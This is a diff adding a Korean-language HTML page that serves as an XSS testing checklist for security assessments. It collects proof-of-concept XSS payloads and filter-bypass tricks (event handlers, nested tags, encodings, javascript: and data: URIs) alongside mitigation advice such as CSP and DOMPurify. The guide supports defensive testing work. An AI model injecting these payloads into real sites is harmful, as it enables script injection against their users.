@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>XSS 점검 가이드 & 페이로드 모음</title>
+  <meta name="description" content="보안 점검용 XSS 페이로드와 점검 방법, 대응 방안 정리" />
+  <style>
+    :root{
+      --bg:#0b0f14;--card:#11161d;--ink:#e7eef6;--muted:#9fb0c3;--brand:#7cc7ff;--accent:#ffd166;--ok:#06d6a0;--warn:#ef476f;
+    }
+    *{box-sizing:border-box}
+    html,body{margin:0;padding:0;background:var(--bg);color:var(--ink);font-family:ui-sans-serif,system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,Cantarell,Noto Sans,sans-serif;line-height:1.6}
+    a{color:var(--brand);text-decoration:none}
+    a:hover{text-decoration:underline}
+    .wrap{max-width:980px;margin:0 auto;padding:28px 18px 64px}
+    header{display:flex;gap:16px;align-items:flex-start;justify-content:space-between;margin-bottom:18px}
+    h1{font-size:clamp(24px,3vw,36px);margin:10px 0}
+    .badge{display:inline-flex;gap:8px;align-items:center;background:linear-gradient(135deg,#15202b,#11161d);border:1px solid #1f2a37;color:var(--muted);padding:8px 12px;border-radius:12px;font-size:13px}
+    .grid{display:grid;gap:16px}
+    @media(min-width:900px){.grid{grid-template-columns:260px 1fr}}
+    nav{position:sticky;top:16px;background:var(--card);border:1px solid #1f2a37;padding:12px 12px;border-radius:14px}
+    nav h3{margin:4px 6px 10px;font-size:14px;color:var(--muted)}
+    nav a{display:block;padding:8px 10px;border-radius:10px;color:var(--ink);font-size:14px}
+    nav a:hover{background:#18212b}
+    section{background:var(--card);border:1px solid #1f2a37;border-radius:16px;padding:18px}
+    h2{margin:0 0 8px;font-size:20px}
+    h3{margin:12px 0 6px;font-size:16px;color:var(--accent)}
+    p,li{color:#d1dde9}
+    .muted{color:var(--muted)}
+    .pill{display:inline-block;background:#17212b;border:1px solid #233142;color:#bcd0e3;padding:2px 8px;border-radius:999px;font-size:12px}
+    .kbd{padding:2px 6px;border-radius:6px;border:1px solid #2a3848;background:#0f141a;color:#cfe1f6;font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace}
+    .codecard{background:#0e1319;border:1px solid #1c2835;border-radius:14px}
+    .codehead{display:flex;align-items:center;justify-content:space-between;padding:10px 12px;border-bottom:1px dashed #203040}
+    .codehead .label{font-size:12px;color:#9eb4cb}
+    pre{margin:0;padding:12px 14px;overflow:auto}
+    code{font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;font-size:13px;color:#b7d5ff}
+    button.copy{border:1px solid #2a394b;background:#12202d;color:#cfe1f6;border-radius:8px;padding:6px 10px;font-size:12px;cursor:pointer}
+    button.copy:hover{background:#15293a}
+    .callout{border-left:4px solid var(--brand);background:#0e151c;padding:12px 14px;border-radius:8px;margin:8px 0}
+    .ok{border-left-color:var(--ok)} .warn{border-left-color:var(--warn)}
+    footer{margin-top:28px;color:var(--muted);font-size:13px}
+    details{background:#0f141a;border:1px solid #223247;border-radius:12px;padding:10px 12px}
+    details[open]{background:#101821}
+    summary{cursor:pointer;color:#cfe1f6}
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <header>
+      <div>
+        <h1>XSS 점검 가이드 & 페이로드 모음</h1>
+        <div class="badge">정적 웹사이트용 · 업데이트: <span id="d"></span></div>
+      </div>
+    </header>
+
+    <div class="grid">
+      <nav>
+        <h3>목차</h3>
+        <a href="#overview">개요</a>
+        <a href="#payloads">추천 페이로드</a>
+        <a href="#methods">점검 방법</a>
+        <a href="#situational">상황별 점검 포인트</a>
+        <a href="#packet">패킷 관점 체크</a>
+        <a href="#mitigation">대응 방안</a>
+        <a href="#safety">유의 사항</a>
+        <a href="#ref">참고</a>
+      </nav>
+
+      <main class="grid" style="grid-template-columns:1fr;gap:18px">
+        <section id="overview">
+          <h2>개요</h2>
+          <p>보안 점검 시 활용할 수 있는 <strong>XSS 페이로드</strong>와 <strong>점검 절차</strong>, <strong>대응 방안</strong>을 한 페이지로 정리했습니다. 모든 예시는 <span class="pill">연구/내부 점검</span> 목적으로만 사용하세요.</p>
+          <div class="callout warn">
+            <strong>주의:</strong> 본 문서의 예시 코드는 <em>텍스트로 표시</em>되며, 복사 버튼으로만 사용할 수 있습니다. 페이지는 예시를 자동 실행하지 않습니다.
+          </div>
+        </section>
+
+        <section id="payloads">
+          <h2>1) 추천 페이로드</h2>
+
+          <h3>1. 기본 테스트</h3>
+          <div class="codecard"><div class="codehead"><span class="label">HTML</span><button class="copy">복사</button></div>
+            <pre><code>&lt;script&gt;alert(1111)&lt;/script&gt;</code></pre>
+          </div>
+
+          <h3>2. &lt;script&gt; 태그 차단 시</h3>
+          <div class="codecard"><div class="codehead"><span class="label">HTML</span><button class="copy">복사</button></div>
+            <pre><code>&lt;details onpointerover=confirm(1111)&gt;&lt;/details&gt;</code></pre>
+          </div>
+
+          <h3>3. 속성 값(value) 내부 삽입 (동작 유발 필요)</h3>
+          <div class="codecard"><div class="codehead"><span class="label">HTML/속성</span><button class="copy">복사</button></div>
+            <pre><code>" onkeydown=confirm(1111) contenteditable onfocus</code></pre>
+          </div>
+
+          <h3>4. 공백 차단 시</h3>
+          <div class="codecard"><div class="codehead"><span class="label">HTML</span><button class="copy">복사</button></div>
+            <pre><code>&lt;svg/onload=confirm(1111)/&gt;</code></pre>
+          </div>
+
+          <h3>5. Polyglot XSS (컨텍스트 다중 호환)</h3>
+          <details>
+            <summary>설명 펼치기</summary>
+            <p>여러 컨텍스트에서 동시에 해석 가능한 페이로드를 의미합니다. 프로젝트 성격에 맞게 별도 정리 영역을 확장하세요.</p>
+          </details>
+        </section>
+
+        <section id="methods">
+          <h2>2) 점검 방법</h2>
+
+          <h3>A. 입력값이 들어가는 위치 파악</h3>
+          <p class="muted">태그 속성 내부 vs. 태그 외부(본문) 여부에 따라 전략이 달라집니다.</p>
+
+          <p><strong>속성 내부 예시</strong></p>
+          <div class="codecard"><div class="codehead"><span class="label">HTML</span><button class="copy">복사</button></div>
+            <pre><code>&lt;input type="text" value="입력 값"&gt;</code></pre>
+          </div>
+          <p>따옴표 종료 후 이벤트 삽입:</p>
+          <div class="codecard"><div class="codehead"><span class="label">HTML</span><button class="copy">복사</button></div>
+            <pre><code>&lt;input value="test" onpointerover=confirm(1111)&gt;</code></pre>
+          </div>
+
+          <p><strong>태그 외부(본문) 예시</strong></p>
+          <div class="codecard"><div class="codehead"><span class="label">HTML</span><button class="copy">복사</button></div>
+            <pre><code>&lt;a href="test.com"&gt;텍스트&lt;/a&gt;&lt;script&gt;alert(1111)&lt;/script&gt;</code></pre>
+          </div>
+
+          <h3>B. 필터링/치환 패턴 식별 및 우회</h3>
+          <ul>
+            <li>특수문자 제한: <code>"</code>, <code>&lt;</code>, <code>(</code>, <code>=</code> 등 → 인코딩/대체 문자 활용</li>
+            <li>이벤트 핸들러 제한: <code>onload</code>, <code>onerror</code> 차단 시 <code>onpointerover</code>, <code>onkeydown</code> 등 검토</li>
+            <li>&lt;script&gt; 차단 시: <code>&lt;svg onload=...&gt;</code>, <code>&lt;meta http-equiv=refresh ...&gt;</code></li>
+          </ul>
+
+          <p><strong>삭제/치환 기반 필터 예시</strong></p>
+          <div class="codecard"><div class="codehead"><span class="label">HTML</span><button class="copy">복사</button></div>
+            <pre><code>&lt;scr&lt;script&gt;ipt&gt;alert(1111)&lt;/scr&lt;script&gt;ipt&gt;</code></pre>
+          </div>
+
+          <p><strong>알림창 함수 필터링 시</strong> (window 속성 활용 등)</p>
+          <div class="codecard"><div class="codehead"><span class="label">HTML/JS</span><button class="copy">복사</button></div>
+            <pre><code>&lt;svg onload="window['al'+'ert'](1)"/&gt;</code></pre>
+          </div>
+
+          <h3>C. 추가 문자열 주입(접두/접미) 대응</h3>
+          <ul>
+            <li>뒤에 문자열이 붙는 경우: <code>&lt;!--</code> 주석 등으로 종료</li>
+            <li>앞에 붙는 경우: 태그 닫기 후 새로운 구문으로 이탈</li>
+          </ul>
+        </section>
+
+        <section id="situational">
+          <h2>3) 상황별 점검 포인트</h2>
+          <ul>
+            <li><strong>특수문자 필터링</strong>: <code>"</code>, <code>'</code>, <code>&lt;&gt;</code>, <code>()</code>, <code>:</code>, <code>=</code></li>
+            <li><strong>응답 맥락 탈출</strong>: <code>"/&gt;</code>, <code>&lt;/script&gt;</code> 등으로 컨텍스트 탈출 시도</li>
+            <li><strong>대소문자 혼용</strong>: <code>&lt;sCriPt&gt;</code></li>
+            <li><strong>이벤트 핸들러</strong>: <code>onload</code>, <code>onerror</code>, <code>onclick</code> 차단 시 <code>ondrag</code>, <code>onfocus</code> 등</li>
+            <li><strong>인코딩</strong>:
+              <ul>
+                <li>URL: <code>%3Cscript%3E</code></li>
+                <li>유니코드: <code>\u003C</code></li>
+                <li>HTML 엔티티: <code>&amp;#x3C;</code></li>
+                <li>Base64: <code>data:text/html;base64,...</code></li>
+              </ul>
+            </li>
+            <li><strong>태그 필터링 우회</strong>: <code>&lt;script&gt;</code>, <code>&lt;img&gt;</code>, <code>&lt;svg&gt;</code> 차단 시 <code>&lt;details&gt;</code>, <code>&lt;object&gt;</code>, <code>&lt;embed&gt;</code></li>
+            <li><strong>하이퍼링크 기반</strong>:
+              <div class="codecard"><div class="codehead"><span class="label">HTML</span><button class="copy">복사</button></div>
+                <pre><code>&lt;a href="javascript:confirm(1)"&gt;Click&lt;/a&gt;</code></pre>
+              </div>
+            </li>
+            <li><strong>폼 전송 기반</strong>:
+              <div class="codecard"><div class="codehead"><span class="label">HTML</span><button class="copy">복사</button></div>
+                <pre><code>&lt;form action="data:text/html,&lt;script&gt;alert(1111)&lt;/script&gt;"&gt;
+  &lt;input type="submit"&gt;
+&lt;/form&gt;</code></pre>
+              </div>
+            </li>
+            <li><strong>공백 필터링 우회</strong>: <code>&lt;svg/onload=...&gt;</code> (구형 브라우저 호환 주의)</li>
+            <li><strong>hidden 필드</strong> 탈출, <strong>iframe/object/embed/meta</strong>의 <code>data:</code> 스킴 활용 등 (환경 의존)</li>
+          </ul>
+        </section>
+
+        <section id="packet">
+          <h2>4) 패킷 관점 체크</h2>
+          <ul>
+            <li><strong>location.hash</strong> 사용 여부: 응답 내 해당 참조가 있으면 <span class="kbd">#&lt;payload&gt;</span> 주입으로 DOM XSS 가능성</li>
+            <li><strong>POST→GET</strong> 변환 시 동작 변화: 동일 파라미터가 GET에서 반영되는지 확인</li>
+          </ul>
+        </section>
+
+        <section id="mitigation">
+          <h2>5) 대응 방안 (필수)</h2>
+          <ul>
+            <li><strong>출력 이스케이프</strong>: 컨텍스트별 적절한 이스케이프 적용</li>
+            <li><strong>CSP(Content Security Policy)</strong> 구성</li>
+            <li><strong>DOMPurify</strong> 등 검증된 Sanitizer 사용</li>
+          </ul>
+          <div class="callout ok"><strong>권장:</strong> 패턴 기반 필터에 의존하지 말고, 아키텍처적으로 <em>신뢰되지 않은 입력을 HTML로 렌더링하지 않도록</em> 설계하세요.</div>
+        </section>
+
+        <section id="safety">
+          <h2>유의 사항</h2>
+          <p>본 문서는 보안 점검 및 연구 목적의 <em>참고 자료</em>입니다. 실제 시스템에 대한 무단 테스트나 공격적 사용을 금지합니다. 고객사/사내 식별 가능 정보는 공개 저장소에 포함하지 마십시오.</p>
+        </section>
+
+        <section id="ref">
+          <h2>참고</h2>
+          <ul>
+            <li>PortSwigger XSS Cheat Sheet: <a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" rel="noopener" target="_blank">링크</a></li>
+          </ul>
+        </section>
+
+        <footer>
+          © <span id="y"></span> XSS Checklist · 포트폴리오/내부 점검 용도
+        </footer>
+      </main>
+    </div>
+  </div>
+
+  <script>
+    // 날짜 표기
+    (function(){
+      const d = new Date();
+      const fmt = d.getFullYear()+"-"+String(d.getMonth()+1).padStart(2,'0')+"-"+String(d.getDate()).padStart(2,'0');
+      document.getElementById('d').textContent = fmt;
+      document.getElementById('y').textContent = d.getFullYear();
+    })();
+
+    // 복사 버튼
+    document.querySelectorAll('.codecard').forEach(card=>{
+      const btn = card.querySelector('button.copy');
+      const codeEl = card.querySelector('code');
+      btn?.addEventListener('click', async ()=>{
+        const text = codeEl.innerText; // HTML 엔티티가 이미 텍스트로 보임 → 그대로 복사
+        try {
+          await navigator.clipboard.writeText(text);
+          btn.textContent = '복사됨';
+          btn.style.background = '#13321f';
+          setTimeout(()=>{btn.textContent='복사';btn.style.background='#12202d'}, 1400);
+        } catch(e){
+          // Fallback
+          const ta=document.createElement('textarea');
+          ta.value=text; document.body.appendChild(ta); ta.select();
+          document.execCommand('copy'); document.body.removeChild(ta);
+          btn.textContent = '복사됨*'; setTimeout(()=>{btn.textContent='복사'}, 1400);
+        }
+      });
+    });
+  </script>
+</body>
+</html>
